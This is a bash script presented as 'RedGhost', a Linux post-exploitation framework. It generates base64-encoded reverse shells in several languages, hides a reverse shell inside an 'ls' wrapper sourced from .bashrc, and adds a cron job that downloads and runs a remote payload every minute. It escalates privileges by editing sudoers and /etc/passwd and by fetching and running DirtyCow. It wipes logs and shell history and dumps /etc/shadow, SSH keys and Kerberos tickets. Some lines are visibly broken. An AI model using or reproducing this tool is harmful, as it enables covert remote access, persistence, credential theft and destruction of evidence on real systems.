#!/bin/bash
INPUT=/tmp/menu.sh.$$
OUTPUT=/tmp/output.sh.$$
trap "rm $OUTPUT; rm $INPUT; exit" SIGHUP SIGINT SIGTERM
declare -A dispatch_table
declare -a options

function display_output(){
		local h=${1-10}
		local w=${2-41}
		local t=${3-Output} 
		local r=${DIALOG_CANCEL=1}
		dialog --title "${t}" --clear --msgbox "$(<$OUTPUT)" ${h} ${w}
}


function prompt() {
    local PS3="$1: "
    local -n _options=$2 _dispatch=$3
    select opt in "${_options[@]}"; do
        if [[ -v _dispatch["$opt"] ]]; then
            "${_dispatch[$opt]}"
            break
        fi
    done
}


payloads=(

"nc -e /bin/bash address prt"
"bash -i >& /dev/tcp/address/prt 0>&1"
"python -c 'import socket,subprocess,os\;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"address\",prt));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
"php -r '\$sock=fsockopen(\"address\",prt);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
"ruby -rsocket -e 'f=TCPSocket.open(\"address\",prt).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
"perl -e 'use Socket;\$i=\"address\";\$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"

)

function encshell(){
		echo -e "Enter listener server address and port\n"
		read -r -p "Address: " address
		read -r -p "Port: " port
		shell="${shell/'address'/$address}"
		shell="${shell/'prt'/$port}"
		encode=$(echo $shell | base64)
}


function genpayload(){
		function create(){
				sel=$REPLY
				shell=${payloads[$sel-1]}
				encshell
				echo "nohup echo \"${encode}\" | base64 -d | bash" > .shell.sh
				chmod +x .shell.sh
				echo -e "Payload saved as `pwd`/.shell.sh"
				read -p "Press enter to continue "
		}


		options=( "Reverse Netcat Shell" "Reverse Bash Shell" "Reverse Python Shell" "Reverse PHP Shell" "Reverse Ruby Shell" "Reverse Perl Shell"  "Return to main menu")
		dispatch_table=(
			["Reverse Netcat Shell"]=create
			["Reverse Bash Shell"]=create
			["Reverse Python Shell"]=create
			["Reverse PHP Shell"]=create
			["Reverse Ruby Shell"]=create
			["Reverse Perl Shell"]=create
			["Return to main menu"]=return
		)
		prompt "Select Reverse Shell payload: " options dispatch_table
}


function lswrap(){
		echo -e "--ls payload wrapper--\n"
		echo -e "*****WARNING*****"
		echo -e "This function wraps this systems ls command with a function that runs a netcat reverse shell when ls is run in terminal\n"
		read -p "enter (continue/exit) or press enter to return to menu: " bs	
		case $bs in
			[CONTINUEcontinue]* )
				shell=${payloads[0]}
				encshell
				echo -e "function ls(){ \n(echo \"${encode}\" | base64 -d | nohup bash > /dev/null 2>.1 &)\n /usr/bin/ls; rm .1; }" > $HOME/.ls
				echo "source ~/.ls" >> ~/.bashrc
				echo -e "\nls wrapper added!\n\nTo effect changes for this terminal session enter 'source ~/.bashrc' in terminal\n"
				read -p "Press enter to continue ";;
		[Exitexit]* ) return 1;;
		esac
}


function cron(){
		read -r -p "Enter server and payload file name for payload dropper (example http://server.com/shell.sh): " server
		read -r -p "Enter name of payload to be executed: " payload
		cronjob="* * * * * wget $server ; sh $payload"
		clear


		function cmmand(){
				echo "( crontab -l | grep -v -F \"$server\" ; echo \"$cronjob\" ) | crontab -" > command.txt
				echo -e "\ncommand saved as command.txt\n"
				echo -e "command:"
				cat command.txt
				echo -e "\n"
				read -p "Press enter to continue "
		}


		function add2sys(){
				( crontab -l | grep -v -F "$server" ; echo "$cronjob" ) | crontab -
				echo -e "\nAdded cron job to crontab\n"
				read -p "Press enter to continue "
		}
		options=("Generate crontab command to download and execute payload every minute" "Add cron job to this system to download and execute payload every minute" "Return to main menu")
		dispatch_table=(
			["Generate crontab command to download and execute payload every minute"]=cmmand
			["Add cron job to this system to download and execute payload every minute"]=add2sys
			["Return to main menu"]=return
		)

		prompt "Generate cron job payload dropper command or add cron job to this machine: " options dispatch_table
}


function escalate() {
		function conmethods(){
				echo -e "\n\tThis function attempts to:\n\nwrite \"$USER ALL=(ALL) NOPASSWD: ALL\" to /etc/sudoers\n*make every user root\n*read doas config\n*exploit docker bash container exploit*\n*To find suid\n*get last edited files\n*list all capabilities\n"
				read -p "Press Enter to continue"

				declare -a methods=(
				"echo '$USER ALL=(ALL) NOPASSWD: ALL' >>/etc/sudoers"
				"sed -i -e 's/x:1000:1000:/x:0:0:/g' /etc/passwd"
				"cat /etc/doas.conf"
				"docker run -it --rm -v $PWD:/mnt bash echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd >2/dev/null"
				"find / -perm 4000 2>/dev/null"
				"find / -mmin -10 2>/dev/null | grep -Ev '^/proc'"
				"getcap -r / 2>/dev/null"
				)
				length=${#methods[@]}

				for (( i=0; i<${length}; i++ ));
					do
					$? 2>/dev/null
					eval "${methods[i]}"
					if (("$?" == 0)); then
					echo -e "${methods[i]}\n[*] Method Succeded [*]\n"
					sleep 1
					else
					echo -e "[*] Method Failed! [*]\n"
					fi
				done
		}


		function search(){
				echo -e '*Searching for password in memory'
				strings /dev/mem -n10 | grep -i PASS
				echo -e '*Searching for password using find'
				find . -type f -exec grep -i -I "PASSWORD" {{}} /dev/null \;
				echo -e '*Searcing for password using grep'
				read -p "Press enter to continue"
				clear
				return 1
		}


		function dirty(){
				echo -e "This may take some time...\n"
				wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c 2>/dev/null
				gcc -pthread dirty.c -o dirty -lcrypt
				./dirty
				rm -rf dirty*
		}


		function linprivesc(){
				wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
				python linuxprivchecker.py
				rm linuxprivchecker.py
		
		}


		function exploitsug(){
				wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
				chmod +x les.sh; ./les.sh; rm les.sh
		}


		function lineum(){
				wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
				chmod +x; ./LinEnum.sh; rm LineEnum.sh
		}


		options=( "Try conventional methods to escalate privileges" "Search for password in this system" "Download and run dirty cow exploit" "Download and run linuxprivchecker.py" "Download and run linux exploit suggester" "Download and run LinEnum" "Return to main menu")
		dispatch_table=(
			["Try conventional methods to escalate privileges"]=conmethods
			["Search for password in this system"]=search
			["Download and run dirty cow exploit"]=dirty
			["Download and run linuxprivchecker.py"]=linprivesc
			["Download and run linux exploit suggester"]=exploitsug
			["Download and run LinEnum"]=lineum
			["Return to main menu"]=return
		)
		prompt "How would you like to get root?: " options dispatch_table
}


function clearlog(){
		rm -rf /var/log/*
		export HISTFILE=
		unset HISTFILE
		rm -rf ~/.bash_history && ln -s ~/.bash_history /dev/null
		touch ~/.bash_history
		zsh% unset HISTFILE HISTSIZE
		tcsh% set history=0
		bash$ set +o history
		ksh$ unset HISTFILE
		find / -type f -exec {}
		echo "Logs cleared!"
		sleep 1.5
}


function info(){
		declare -a commands=(

		"hostname -f;"
		"ip addr show;"
		"ip ro show"
		"ifconfig -a"
		"route -n"
		"cat /etc/network/interfaces"
		"iptables -L -n -v"	
		"iptables -t nat -L -n -v"
		"ip6tables -L -n -v"
		"iptables-save"
		"netstat -anop"
		"netstat -r"
		"netstat -nltupw"
		"arp -a"
		"lsof -nPi"
		"cat /proc/net/"
		"ls -alh /home/*/"
		"ls -alh /home/*/.ssh/"
		"cat /home/*/.ssh/authorized_keys"
		"cat /home/*/.ssh/known_hosts"
		"cat /home/*/.hist"
		"find /home/*/.vnc /home/*/.subversion -type f"
		"grep ^ssh /home/*/.hist"
		"grep ^telnet /home/*/.hist"
		"grep ^mysql /home/*/.hist"
		"cat /home/*/.viminfo"
		"crontab -l"
		"cat /home/*/.mysql_history"
		"/home/*/.ssh/id*"
		"/tmp/krb5cc_*"
		"/tmp/krb5.keytab"
		"/home/*/.gnupg/secring.gpgs"
		"ls -aRl /etc/ * awk '$1 ~ /w.$/' * grep -v lrwx 2>/dev/nullte"
		"cat /etc/issue{,.net}"
		"cat /etc/master.passwd"
		"cat /etc/group"
		"cat /etc/hosts"
		"cat /etc/crontab"
		"cat /etc/sysctl.conf"
		"for user in $(cut -f1 -d: /etc/passwd); do echo $user; crontab -u $user -l;"
		"cat /etc/resolv.conf"
		"ls -alh /root/"
		"cat /etc/sudoers"
		"cat /etc/shadow"
		"cat /etc/master.passwd"
		"cat /var/spool/cron/crontabs/* | cat /var/spool/cron/*"
		"lsof -nPi"
		"ls /home/*/.ssh/*"
		)

		length=${#commands[@]}

		for (( i=0; i<${length}; i++ ));
			do
			$? 2>/dev/null
			eval "${commands[i]}"
			if (("$?" == 0)); then
			sleep 1
			else
			echo -e "${commands[i]} <- command Failed!\n"
			sleep 1
			fi
		done
}


function banip(){
		clear
		sleep 1
		echo -e '\nConnected IP Addresses:'
		netstat -anpt | grep ESTABLISHED | awk '{ print $5 }' | cut -d: -f1 | sort -u
		echo -e '\nIP Addresses connected via SSH:'
		netstat -tnpa | grep 'ESTABLISHED.*sshd' | awk '{ print $5 }' | cut -d: -f1 | sort -u
		echo -e '\nCurrent activity on this system:\n'
		w
		echo -e "\nDo you want to ban an address or return to menu?" 
		read -p 'enter (ban/exit) or press enter to return to menu: ' bs	
		case $bs in
			[Banban]* ) read -r -p  'Enter IP to be banned: ' address; iptables -A INPUT -s $address -j DROP;;
			[Exitexit]* ) return 1;;
		esac
}


while true
do

dialog --clear --nocancel --backtitle "Coded by d4rkst4t1c.." \
--title "[ R E D G H O S T - P O S T  E X P L O I T - T O O L ]" \
--menu "Linux post exploitation framework and payload generator." 15 60 8 \
Payloads "Generate Reverse Shells" \
lsWrapper "Inject 'ls' command with payload" \
Crontab "Add cron job for persistence" \
GetRoot "Escalate privileges" \
Clearlogs "Clear all logs" \
MassinfoGrab "Gain recon on the system" \
BanIP "Ban an IP Address" \
Exit "" 2>"${INPUT}"

menuitem=$(<"${INPUT}")

case $menuitem in
	Payloads) clear; genpayload;;
	lsWrapper) clear; lswrap;;
	Crontab) clear; cron;;
	GetRoot) clear; escalate;; 
	Clearlogs) clear; clearlog;;
	MassinfoGrab) clear; info;;
	BanIP) banip;;
	Exit) clear; break;;
esac

done

[ -f $OUTPUT ] && rm $OUTPUT
[ -f $INPUT ] && rm $INPUT
